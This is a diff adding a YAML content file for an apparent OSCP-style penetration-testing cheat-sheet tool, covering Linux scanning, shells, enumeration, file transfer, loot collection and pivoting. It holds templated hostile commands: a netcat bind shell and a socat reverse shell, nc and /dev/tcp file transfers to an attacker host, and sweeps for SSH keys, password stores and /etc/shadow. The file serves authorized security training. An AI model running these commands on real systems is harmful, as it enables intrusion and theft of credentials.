@@ -1,0 +1,315 @@
+# Cephalo content — Linux finishers: rustscan (LX-1), shells (LX-4), manual enum (LX-6),
+# transfer (LX-5), loot + pivot (LX-8). Authorized testing only.
+sections:
+  - id: linux.p1b
+    title: Fast scanning
+    os: linux
+    phase: recon
+    order: 12
+    description: rustscan / masscan for speed, piped into nmap for depth.
+    techniques: [linux.recon.rustscan]
+    packs: [oscp]
+  - id: linux.p5b
+    title: Shells (bind / socat / pwncat / web)
+    os: linux
+    phase: foothold
+    order: 52
+    description: Beyond reverse shells — bind shells, full-PTY socat, pwncat, web shells.
+    techniques: [linux.shell.bind, linux.shell.socat, linux.shell.pwncat, linux.shell.webshell]
+    packs: [oscp]
+  - id: linux.p6c
+    title: Manual local enumeration
+    os: linux
+    phase: privilege-escalation
+    order: 61
+    description: The manual checks that automated tools miss; live process spying.
+    techniques: [linux.enum.manualdeep, linux.enum.pspy]
+    packs: [oscp]
+  - id: linux.p7b
+    title: Loot, transfer & pivot
+    os: linux
+    phase: post-exploitation
+    order: 72
+    description: base64/nc/dev-tcp transfer, loot collection, and tunneling onward.
+    techniques: [linux.post.transfer, linux.post.loot, linux.post.pivot]
+    packs: [oscp]
+
+techniques:
+  - id: linux.recon.rustscan
+    title: rustscan / masscan
+    os: [linux]
+    phase: recon
+    summary: All-ports in seconds, then hand the open set to nmap for -sCV.
+    commands: [linux.recon.rustscan.run]
+    tags: [nmap, enumeration]
+    archetypeBand: high
+    references: [ref.nmap]
+    confidence: verified
+    packs: [oscp]
+
+  - id: linux.shell.bind
+    title: Bind shell
+    os: [linux]
+    phase: foothold
+    summary: Target listens; you connect in (useful when callbacks are filtered).
+    commands: [linux.shell.bind.nc]
+    tags: [cross-cutting]
+    archetypeBand: medium
+    references: [ref.hacktricks]
+    confidence: verified
+    packs: [oscp]
+
+  - id: linux.shell.socat
+    title: socat full-PTY shell
+    os: [linux]
+    phase: foothold
+    summary: A fully interactive TTY without the manual stty dance.
+    commands: [linux.shell.socat.listen, linux.shell.socat.connect]
+    tags: [cross-cutting]
+    archetypeBand: high
+    references: [ref.hacktricks]
+    confidence: verified
+    packs: [oscp]
+
+  - id: linux.shell.pwncat
+    title: pwncat-cs
+    os: [linux]
+    phase: foothold
+    summary: A smart listener with auto-stabilisation and post-exploit modules.
+    commands: [linux.shell.pwncat.listen]
+    tags: [cross-cutting]
+    archetypeBand: medium
+    references: [ref.hacktricks]
+    confidence: verified
+    packs: [oscp]
+
+  - id: linux.shell.webshell
+    title: Web shell (methodology)
+    os: [linux]
+    phase: foothold
+    summary: Where an upload/LFI allows, a minimal web shell gives command execution.
+    body: |
+      Methodology only: once you can place + reach a server-executable file, a tiny
+      command-runner yields execution — then immediately upgrade to an interactive
+      reverse shell via the VariableBar cards.
+    commands: [linux.shell.webshell.note]
+    tags: [cross-cutting, file-upload]
+    archetypeBand: medium
+    references: [ref.patt]
+    confidence: verified
+    packs: [oscp]
+
+  - id: linux.enum.manualdeep
+    title: Manual deep enumeration
+    os: [linux]
+    phase: privilege-escalation
+    summary: Capabilities, listeners, sensitive-file perms, SSH keys, history.
+    commands: [linux.enum.manualdeep.run]
+    tags: [privesc, enumeration]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.hacktricks]
+    confidence: verified
+    packs: [oscp]
+
+  - id: linux.enum.pspy
+    title: pspy (process / cron spy)
+    os: [linux]
+    phase: privilege-escalation
+    summary: Watch processes and cron jobs fire without root — catches hidden scheduled tasks.
+    commands: [linux.enum.pspy.run]
+    tags: [privesc, cron]
+    archetypeBand: high
+    references: [ref.pspy]
+    confidence: verified
+    packs: [oscp]
+
+  - id: linux.post.transfer
+    title: File transfer (base64 / nc / /dev/tcp)
+    os: [linux]
+    phase: post-exploitation
+    summary: Move files when http/smb are blocked.
+    commands: [linux.post.transfer.base64]
+    tags: [cross-cutting]
+    archetypeBand: high
+    references: [ref.hacktricks]
+    confidence: verified
+    packs: [oscp]
+
+  - id: linux.post.loot
+    title: Loot collection
+    os: [linux]
+    phase: post-exploitation
+    summary: Sweep for keys, password stores, configs and DB dumps.
+    commands: [linux.post.loot.find]
+    tags: [creds]
+    archetypeBand: medium
+    references: [ref.hacktricks]
+    confidence: verified
+    packs: [oscp]
+
+  - id: linux.post.pivot
+    title: Pivot with ligolo-ng / proxychains
+    os: [linux]
+    phase: pivoting
+    summary: A tun-based pivot (ligolo-ng) or SOCKS via proxychains to reach the internal net.
+    commands: [linux.post.pivot.ligolo, linux.post.pivot.proxychains]
+    tags: [cross-cutting, pivoting]
+    archetypeBand: high
+    references: [ref.ligolong, ref.chisel]
+    confidence: verified
+    packs: [oscp]
+
+commands:
+  - id: linux.recon.rustscan.run
+    title: rustscan → nmap
+    template: "rustscan -a {{RHOST}} --ulimit 5000 -- -sCV -oN nmap-rs.txt"
+    tool: rustscan
+    description: Fast full-port discovery handed to nmap for service/script scanning.
+    os: [linux]
+    phase: recon
+    tags: [nmap]
+    notes:
+      - "masscan alternative: masscan -p1-65535 {{RHOST}} --rate 1000"
+    confidence: verified
+    references: [ref.nmap]
+    danger: low
+    packs: [oscp]
+
+  - id: linux.shell.bind.nc
+    title: Netcat bind shell (on target)
+    template: "nc -lvnp {{LPORT}} -e /bin/bash"
+    tool: netcat
+    description: Target listens with a shell attached; connect in with nc.
+    os: [linux]
+    phase: foothold
+    tags: [cross-cutting]
+    confidence: verified
+    references: [ref.hacktricks]
+    danger: medium
+    packs: [oscp]
+  - id: linux.shell.socat.listen
+    title: socat listener (full PTY)
+    template: "socat file:`tty`,raw,echo=0 TCP-LISTEN:{{LPORT}}"
+    tool: socat
+    description: Your end of a fully-interactive socat shell.
+    os: [linux]
+    phase: foothold
+    tags: [cross-cutting]
+    confidence: verified
+    references: [ref.hacktricks]
+    danger: low
+    packs: [oscp]
+  - id: linux.shell.socat.connect
+    title: socat callback (target)
+    template: "socat TCP:{{LHOST}}:{{LPORT}} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane"
+    tool: socat
+    description: Target side of the full-PTY socat shell.
+    os: [linux]
+    phase: foothold
+    tags: [cross-cutting]
+    confidence: verified
+    references: [ref.hacktricks]
+    danger: medium
+    packs: [oscp]
+  - id: linux.shell.pwncat.listen
+    title: pwncat-cs listener
+    template: "pwncat-cs -lp {{LPORT}}"
+    tool: pwncat
+    description: Auto-stabilising listener with post-exploitation modules.
+    os: [linux]
+    phase: foothold
+    tags: [cross-cutting]
+    confidence: verified
+    references: [ref.hacktricks]
+    danger: low
+    packs: [oscp]
+  - id: linux.shell.webshell.note
+    title: Web shell (pointer)
+    template: "# place a minimal command-runner where the server executes it, then upgrade to a reverse shell"
+    shell: text
+    description: Methodology pointer — no payload shipped.
+    os: [linux]
+    phase: foothold
+    tags: [cross-cutting]
+    confidence: verified
+    references: [ref.patt]
+    danger: medium
+    packs: [oscp]
+
+  - id: linux.enum.manualdeep.run
+    title: Manual deep checks
+    template: "id; getcap -r / 2>/dev/null; ss -tlnp; ls -la /etc/passwd /etc/shadow ~/.ssh 2>/dev/null; tail ~/.bash_history 2>/dev/null"
+    description: Capabilities, listeners, sensitive-file perms, SSH keys, shell history.
+    os: [linux]
+    phase: privilege-escalation
+    tags: [privesc]
+    confidence: verified
+    references: [ref.hacktricks]
+    danger: low
+    packs: [oscp]
+  - id: linux.enum.pspy.run
+    title: Run pspy
+    template: "./pspy64 -pf -i 1000"
+    tool: pspy
+    description: Live, unprivileged view of processes and cron jobs as they execute.
+    os: [linux]
+    phase: privilege-escalation
+    tags: [privesc, cron]
+    confidence: verified
+    references: [ref.pspy]
+    danger: low
+    packs: [oscp]
+
+  - id: linux.post.transfer.base64
+    title: base64 copy-paste transfer
+    template: "base64 -w0 loot.tar.gz"
+    description: Encode for clipboard transfer; decode on the other end with base64 -d.
+    os: [linux]
+    phase: post-exploitation
+    tags: [cross-cutting]
+    notes:
+      - "No-tool nc: target `nc {{LHOST}} {{LPORT}} < file`; you `nc -lvnp {{LPORT}} > file`."
+      - "/dev/tcp pull: `cat < /dev/tcp/{{LHOST}}/{{LPORT}} > file`."
+    confidence: verified
+    references: [ref.hacktricks]
+    danger: low
+    packs: [oscp]
+  - id: linux.post.loot.find
+    title: Sweep for secrets
+    template: "find / \\( -name 'id_rsa' -o -name '*.kdbx' -o -name '*.ovpn' -o -name '*.bak' \\) 2>/dev/null; sudo -l"
+    description: Find SSH keys, password databases, VPN configs, backups; recheck sudo.
+    os: [linux]
+    phase: post-exploitation
+    tags: [creds]
+    confidence: verified
+    references: [ref.hacktricks]
+    danger: low
+    packs: [oscp]
+
+  - id: linux.post.pivot.ligolo
+    title: ligolo-ng tunnel
+    template: "./agent -connect {{LHOST}}:{{LPORT}} -ignore-cert"
+    tool: ligolo-ng
+    description: From the foothold, connect to your ligolo proxy for a tun-routed pivot.
+    os: [linux]
+    phase: pivoting
+    tags: [cross-cutting, pivoting]
+    notes:
+      - "On your box: ./proxy -selfcert; then `ifconfig` a route to the internal subnet."
+    confidence: verified
+    references: [ref.ligolong]
+    danger: low
+    packs: [oscp]
+  - id: linux.post.pivot.proxychains
+    title: proxychains over a SOCKS pivot
+    template: "proxychains -q nmap -sT -Pn {{TARGET}}"
+    tool: proxychains
+    description: Route tooling through a SOCKS proxy (chisel/ssh -D) into the internal net.
+    os: [linux]
+    phase: pivoting
+    tags: [cross-cutting, pivoting]
+    confidence: verified
+    references: [ref.chisel]
+    danger: low
+    packs: [oscp]
